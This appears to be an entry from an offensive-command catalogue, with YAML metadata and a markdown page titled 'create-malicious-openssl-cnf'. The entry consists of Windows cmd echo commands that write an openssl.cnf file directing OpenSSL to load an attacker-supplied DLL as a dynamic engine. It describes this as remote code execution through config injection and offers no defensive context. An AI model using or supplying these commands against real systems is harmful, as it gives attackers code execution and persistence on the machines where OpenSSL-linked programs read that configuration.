---
data: |-
  echo [openssl_init] > C:\usr\local\ssl\openssl.cnf
  echo engines = engine_section >> C:\usr\local\ssl\openssl.cnf
  echo [engine_section] >> C:\usr\local\ssl\openssl.cnf
  echo dynamic_path = C:\path\to\malicious.dll >> C:\usr\local\ssl\openssl.cnf
  echo dynamic_id = malicious_engine >> C:\usr\local\ssl\openssl.cnf
tags:
  - config-injection
type: command
output: null
executor: cmd
platforms:
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:17.486Z'
id: 00609788-fe24-41f0-8207-c9177ce7e211
verified: false
validated: true
submitted: true
---
# create-malicious-openssl-cnf

## Command

```cmd
echo [openssl_init] > C:\usr\local\ssl\openssl.cnf
echo engines = engine_section >> C:\usr\local\ssl\openssl.cnf
echo [engine_section] >> C:\usr\local\ssl\openssl.cnf
echo dynamic_path = C:\path\to\malicious.dll >> C:\usr\local\ssl\openssl.cnf
echo dynamic_id = malicious_engine >> C:\usr\local\ssl\openssl.cnf
```

## Description

Generates a malicious openssl.cnf file to load a custom engine DLL, enabling RCE via OpenSSL config injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| echo | Outputs text to file | Yes |
| > / >> | Overwrite/append to cnf | Yes |
| Content | Config sections for engine | Yes |

## Examples

### Basic Usage

```cmd
echo [openssl_init] > openssl.cnf
echo engines = engine_section >> openssl.cnf
```

### Advanced Usage

Customize dynamic_path to actual DLL.

## Expected Output

File created with config content; verify with type openssl.cnf.

## Related

- [[Related Procedure]]
